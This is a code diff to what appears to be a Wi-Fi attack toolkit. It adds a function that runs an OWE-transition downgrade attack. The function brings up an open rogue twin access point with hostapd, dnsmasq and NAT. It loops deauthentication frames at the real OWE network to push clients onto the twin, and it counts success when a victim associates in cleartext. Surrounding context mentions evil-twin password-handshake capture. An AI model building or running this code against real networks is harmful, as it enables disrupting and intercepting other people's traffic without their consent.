@@ -17,6 +17,7 @@ the tool indefinitely.
 from __future__ import annotations
 
 import os
+import re
 import secrets
 import signal
 import string
@@ -62,6 +63,15 @@ class DowngradeTwinResult:
     """Outcome of a run_downgrade_twin() call."""
     status: HandshakeStatus = HandshakeStatus.NONE
     outfile: str | None = None
+    elapsed: float = 0.0
+    detail: str = ""
+
+
+@dataclass
+class OweDowngradeResult:
+    """Outcome of a run_owe_downgrade() call."""
+    success: bool = False
+    client_mac: str | None = None
     elapsed: float = 0.0
     detail: str = ""
 
@@ -262,6 +272,16 @@ def _iptables_nat_remove(iface_ap: str, iface_mon: str) -> None:
     _run(["iptables", "-D", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
     _run(["iptables", "-D", "FORWARD", "-i", iface_mon, "-o", iface_ap,
           "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
+
+
+def _station_dump(iface: str) -> list[str]:
+    """MACs of stations currently associated to iface in AP mode, via
+    `iw dev <iface> station dump`. Used by run_owe_downgrade() as the
+    success signal instead of a DHCP lease -- L2 association alone is
+    enough to prove the client downgraded to our open twin, even if it
+    never actually requests an IP."""
+    _rc, out = _run(["iw", "dev", iface, "station", "dump"])
+    return re.findall(r"Station\s+([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", out)
 
 
 # ── main entry point ──────────────────────────────────────────────────────────
@@ -578,6 +598,138 @@ def run_downgrade_twin(
         return DowngradeTwinResult(
             status=best, outfile=outfile, elapsed=elapsed,
             detail=f"{best.value} handshake captured (real password, unverified by us) -> {outfile}",
+        )
+
+    finally:
+        stop.set()
+        cleanup()
+
+
+# ── owe_downgrade: OWE-transition rogue OPEN twin ──────────────────────────────
+
+def run_owe_downgrade(
+    iface_ap: str,
+    iface_mon: str,
+    owe_bssid: str,
+    open_ssid: str,
+    channel: int,
+    client: str = BROADCAST,
+    timeout: float = 120.0,
+    stop_event: threading.Event | None = None,
+    progress_fn=None,
+) -> OweDowngradeResult:
+    """OWE (Enhanced Open) transition-mode downgrade: broadcast the target's
+    own already-advertised paired open network (open_ssid, discovered via
+    secure.owe_transition_info()) as our own rogue AP, and deauth clients
+    off the REAL OWE bssid so they fall back to it.
+
+    Unlike run_eviltwin()/run_downgrade_twin(), there's nothing to
+    harvest here -- OWE has no password, and this rogue twin is open, not
+    WPA2-PSK -- the whole point of OWE-transition mode downgrade is that
+    a client's traffic goes back to cleartext the moment it associates.
+    Success is simply a client associating (checked via `iw ... station
+    dump`, not a DHCP lease, since L2 association alone already proves
+    the downgrade regardless of whether the client ever requests an IP).
+    No captive portal -- there's no password to collect.
+
+    Args mirror run_eviltwin() where they mean the same thing:
+        owe_bssid: the REAL OWE BSSID -- used only for deauth targeting.
+        open_ssid: the paired open network's SSID (from the transition
+            IE), broadcast by our rogue AP.
+    """
+    log = progress_fn or (lambda msg: None)
+    stop = stop_event or threading.Event()
+    t_start = time.monotonic()
+    procs: list[subprocess.Popen] = []
+    tmpfiles: list[str] = []
+
+    def cleanup():
+        for p in procs:
+            try:
+                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
+                pass
+        for f in tmpfiles:
+            try:
+                os.unlink(f)
+            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
+                pass
+        _flush_ip(iface_ap)
+        _iptables_nat_remove(iface_ap, iface_mon)
+
+    try:
+        log(f"assigning IP to {iface_ap}")
+        if not _assign_ip(iface_ap):
+            log("failed to assign IP")
+            return OweDowngradeResult(detail="failed to assign IP to AP interface")
+
+        ap_chan = channel if 1 <= channel <= 13 else 6
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                          prefix="atwa_hostapd_owe_", delete=False) as hconf:
+            hconf.write(_hostapd_conf(iface_ap, open_ssid, ap_chan))
+        tmpfiles.append(hconf.name)
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
+                                          prefix="atwa_dnsmasq_owe_", delete=False) as dconf:
+            dconf.write(_dnsmasq_conf(iface_ap))
+        tmpfiles.append(dconf.name)
+
+        log(f"starting open rogue twin on {iface_ap} (ssid={open_ssid!r}, channel={ap_chan})")
+        hostapd_proc = _popen(["hostapd", hconf.name])
+        procs.append(hostapd_proc)
+        time.sleep(_HOSTAPD_START_WAIT)
+        if hostapd_proc.poll() is not None:
+            log("hostapd exited immediately")
+            return OweDowngradeResult(detail="hostapd exited immediately — check interface/driver")
+        log("rogue twin up")
+
+        log("starting dnsmasq (DHCP/DNS for rogue AP)")
+        dns_proc = _popen(["dnsmasq", "--no-daemon", f"--conf-file={dconf.name}"])
+        procs.append(dns_proc)
+        time.sleep(_DNSMASQ_START_WAIT)
+        log("dnsmasq up")
+
+        _iptables_nat_add(iface_ap, iface_mon)
+        log("NAT rules added")
+
+        def _deauth_loop():
+            round_n = 0
+            while not stop.is_set():
+                round_n += 1
+                try:
+                    sent = _deauth(iface_mon, owe_bssid, client=client, channel=channel, progress_fn=log)
+                    if sent == 0:
+                        log(f"owe_downgrade deauth round {round_n}: did NOT go out to {owe_bssid} — see the warning above")
+                    else:
+                        log(f"owe_downgrade deauth round {round_n}: sent {sent} deauth frame(s) to {owe_bssid}")
+                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
+                    log(f"owe_downgrade deauth round {round_n} failed: {exc}")
+                stop.wait(10.0)
+
+        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
+        deauth_thread.start()
+
+        log(f"waiting up to {timeout:.0f}s for a client to associate to the open twin")
+        deadline = time.monotonic() + timeout
+        associated: str | None = None
+        while not stop.is_set() and time.monotonic() < deadline:
+            stations = _station_dump(iface_ap)
+            if stations:
+                associated = stations[0]
+                break
+            time.sleep(1.0)
+
+        stop.set()
+        elapsed = time.monotonic() - t_start
+
+        if associated is None:
+            log("no client associated with the open twin")
+            return OweDowngradeResult(elapsed=elapsed, detail="no client associated with the open twin")
+        log(f"client {associated} associated with the open twin -> downgraded to cleartext")
+        return OweDowngradeResult(
+            success=True, client_mac=associated, elapsed=elapsed,
+            detail=f"client {associated} downgraded to open (cleartext) after {elapsed:.0f}s",
         )
 
     finally:
